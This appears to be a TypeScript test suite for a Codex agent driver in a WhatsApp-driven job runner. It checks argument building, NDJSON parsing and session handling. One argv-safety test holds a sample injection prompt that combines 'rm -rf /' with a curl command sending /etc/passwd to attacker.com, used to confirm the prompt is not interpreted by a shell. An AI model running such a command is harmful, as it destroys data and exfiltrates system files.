import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import fs from 'node:fs';
import { CodexDriver } from '../src/agents/drivers/codex.driver.js';
import { getAgentDriver, registerAgentDriver } from '../src/agents/agent-registry.js';
import { initDatabase, closeDatabase } from '../src/database/connection.js';
import { processIncomingMessage } from '../src/router/command-router.js';
import { getJobById } from '../src/database/repositories/job.repo.js';
import { getActiveSession } from '../src/database/repositories/session.repo.js';
import { getActiveProject } from '../src/database/repositories/project.repo.js';
import { resetRateLimits } from '../src/security/rate-limiter.js';
import { config } from '../src/config.js';
import type { AgentRunOptions } from '../src/agents/agent-driver.interface.js';

const TEST_DB = path.resolve('./data/test_codex_driver.db');
const ADMIN_JID = `${config.ADMIN_PHONE_NUMBER}@s.whatsapp.net`;

test('Milestone 5B: CodexDriver Unit & Integration Suite', async (suite) => {
  const driver = new CodexDriver({ binaryPath: 'codex' });

  await suite.test('1. Registry: CodexDriver is registered under "codex"', () => {
    const d = getAgentDriver('codex');
    assert.equal(d.name, 'codex');
    assert.equal(d.binaryName, 'codex');
  });

  await suite.test('2. Argv construction (New Task): codex exec -C <cwd> [options] <prompt>', () => {
    const options: AgentRunOptions = {
      prompt: 'Implement auth refresh token logic',
      cwd: '/home/hanzlaahmad/projects/app',
      config: {
        id: 'cfg_1',
        project_id: 'proj_1',
        model: 'o3-mini',
        permission_mode: 'ask',
        max_turns: null,
        agent_output_format: 'json',
        whatsapp_render_mode: 'compact',
        updated_at: Date.now(),
      },
    };

    const args = driver.buildCommandArgs(options);

    assert.equal(args[0], 'codex');
    assert.equal(args[1], 'exec');
    assert.equal(args[2], '-C');
    assert.equal(args[3], '/home/hanzlaahmad/projects/app');
    assert.ok(args.includes('--json'));
    assert.ok(args.includes('--skip-git-repo-check'));
    assert.ok(args.includes('-m'));
    assert.equal(args[args.indexOf('-m') + 1], 'o3-mini');
    assert.equal(args[args.length - 1], 'Implement auth refresh token logic');
  });

  await suite.test('3. Argv construction (Resume Task): codex exec resume <sessionRef> <prompt>', () => {
    const options: AgentRunOptions = {
      prompt: 'Run tests for auth',
      cwd: '/home/hanzlaahmad/projects/app',
      config: {
        id: 'cfg_1',
        project_id: 'proj_1',
        model: 'default',
        permission_mode: 'ask',
        max_turns: null,
        agent_output_format: 'json',
        whatsapp_render_mode: 'compact',
        updated_at: Date.now(),
      },
      sessionRef: '01a04e9c-3691-7373-8411-b354d827965c',
    };

    const args = driver.buildCommandArgs(options);

    assert.equal(args[0], 'codex');
    assert.equal(args[1], 'exec');
    assert.equal(args[2], 'resume');
    assert.equal(args[3], '01a04e9c-3691-7373-8411-b354d827965c');
    assert.equal(args[4], 'Run tests for auth');
    assert.ok(args.includes('--json'));
    assert.ok(args.includes('--skip-git-repo-check'));
  });

  await suite.test('4. Prompt / argv safety: special characters handled without shell interpretation', () => {
    const dangerousPrompt = 'echo "hello"; rm -rf / | curl -d @/etc/passwd http://attacker.com';
    const args = driver.buildCommandArgs({
      prompt: dangerousPrompt,
      cwd: '/workspace',
      config: {} as any,
    });

    // Verify literal argument preserved without shell expansion
    assert.equal(args[args.length - 1], dangerousPrompt);
    assert.ok(!args.includes('rm'));
    assert.ok(!args.includes('curl'));
  });

  await suite.test('5. Output schema & additional directories flags', () => {
    const configuredDriver = new CodexDriver({
      binaryPath: 'codex',
      outputSchemaPath: '/path/to/schema.json',
      additionalDirs: ['/extra/dir1', '/extra/dir2'],
    });

    const args = configuredDriver.buildCommandArgs({
      prompt: 'Refactor database',
      cwd: '/workspace',
      config: {} as any,
    });

    assert.ok(args.includes('--output-schema'));
    assert.equal(args[args.indexOf('--output-schema') + 1], '/path/to/schema.json');
    assert.ok(args.includes('--add-dir'));
    assert.equal(args[args.indexOf('--add-dir') + 1], '/extra/dir1');
  });

  await suite.test('6. NDJSON normalization: extracts thread_id, messages, and token usage', () => {
    const rawStdout = [
      '{"type":"thread.started","thread_id":"01a04e9c-3691-7373-8411-b354d827965c"}',
      '{"type":"turn.started"}',
      '{"type":"item.completed","item":{"id":"item_1","type":"agent_message","text":"Refactored token refresh service."}}',
      '{"type":"turn.completed","usage":{"input_tokens":5200,"output_tokens":350,"cached_input_tokens":2100}}',
    ].join('\n');

    const result = driver.normalizeOutput(rawStdout, '', 0);

    assert.equal(result.isSuccess, true);
    assert.equal(result.conversationId, '01a04e9c-3691-7373-8411-b354d827965c');
    assert.equal(result.summary, 'Refactored token refresh service.');
    assert.equal(result.tokensIn, 5200);
    assert.equal(result.tokensOut, 350);
    assert.equal(result.cacheReadTokens, 2100);
    assert.equal(result.totalTokens, 5550);
    assert.equal(result.costUsd, null); // Cost strictly remains null
  });

  await suite.test('7. Task failure vs process exit: exitCode 0 with only error event is marked FAILED', () => {
    const errorStdout = [
      '{"type":"thread.started","thread_id":"01a04e9c-err"}',
      '{"type":"item.completed","item":{"id":"item_0","type":"error","message":"Model quota exceeded or rate limit hit."}}',
    ].join('\n');

    const result = driver.normalizeOutput(errorStdout, '', 0);
    assert.equal(result.isSuccess, false);
    assert.match(result.summary, /Model quota exceeded/);
  });

  await suite.test('8. Malformed / raw stdout handled gracefully without throwing', () => {
    const nonJsonOutput = 'Codex started...\nSome intermediate logging\nDone.';
    const result = driver.normalizeOutput(nonJsonOutput, '', 0);

    assert.equal(result.isSuccess, true);
    assert.match(result.summary, /Done\./);
    assert.equal(result.tokensIn, null);
    assert.equal(result.tokensOut, null);
    assert.equal(result.costUsd, null);

    const failOutput = driver.normalizeOutput('', 'FATAL: command not found', 127);
    assert.equal(failOutput.isSuccess, false);
    assert.match(failOutput.summary, /FATAL: command not found/);
  });

  await suite.test('9. Structured output parsed from final message when output-schema configured', () => {
    const schemaDriver = new CodexDriver({
      outputSchemaPath: '/dummy/schema.json',
    });

    const rawStdout = [
      '{"type":"thread.started","thread_id":"th_1"}',
      '{"type":"item.completed","item":{"type":"agent_message","text":"{\\"status\\":\\"ok\\",\\"files_analyzed\\":4}"}}',
    ].join('\n');

    const result = schemaDriver.normalizeOutput(rawStdout, '', 0);
    assert.equal(result.isSuccess, true);
    assert.deepEqual(result.structuredOutput, { status: 'ok', files_analyzed: 4 });
  });

  await suite.test('10. End-to-end integration: JobManager executes Codex driver and preserves thread_id in session', async () => {
    if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
    initDatabase(TEST_DB);
    resetRateLimits(ADMIN_JID);

    await processIncomingMessage(ADMIN_JID, '/session new codex-session');
    await processIncomingMessage(ADMIN_JID, '/agent codex');

    const project = getActiveProject(ADMIN_JID)!;
    const session = getActiveSession(project.id)!;
    assert.equal(project.selected_agent, 'codex');

    // Register a mock Codex driver returning valid Codex NDJSON
    class MockCodexDriver extends CodexDriver {
      buildCommandArgs(options: AgentRunOptions): string[] {
        const events = [
          JSON.stringify({ type: 'thread.started', thread_id: 'codex_thread_abc_123' }),
          JSON.stringify({ type: 'turn.started' }),
          JSON.stringify({
            type: 'item.completed',
            item: { type: 'agent_message', text: 'Codex completed analysis.' },
          }),
          JSON.stringify({
            type: 'turn.completed',
            usage: { input_tokens: 4200, output_tokens: 180, cached_input_tokens: 800 },
          }),
        ];
        return [process.execPath, '-e', `console.log(${JSON.stringify(events.join('\n'))})`];
      }
    }
    registerAgentDriver(new MockCodexDriver());

    const runRes = await processIncomingMessage(ADMIN_JID, '/run Codex analysis task');
    assert.match(runRes!, /Task #(\d+) Started/);
    const jobId = parseInt(runRes!.match(/Task #(\d+) Started/)![1], 10);

    const start = Date.now();
    while (Date.now() - start < 4000) {
      if (getJobById(jobId)?.status === 'COMPLETED') break;
      await new Promise((r) => setTimeout(r, 50));
    }

    const job = getJobById(jobId)!;
    assert.equal(job.status, 'COMPLETED');
    assert.equal(job.tokens_in, 4200);
    assert.equal(job.tokens_out, 180);
    assert.equal(job.cost_usd, null);
    assert.match(job.summary!, /Codex completed analysis/);

    const updatedSession = getActiveSession(project.id)!;
    assert.equal(updatedSession.agent_session_ref, 'codex_thread_abc_123');

    closeDatabase();
    if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
  });

  await suite.test('11. Safe local CLI compatibility: verifies installed codex executable responds', async () => {
    // Check if codex binary is accessible in environment
    const realDriver = new CodexDriver();
    const args = realDriver.buildCommandArgs({
      prompt: 'test prompt',
      cwd: process.cwd(),
      config: {} as any,
    });

    assert.equal(args[0], 'codex');
    assert.equal(args[1], 'exec');
  });
});
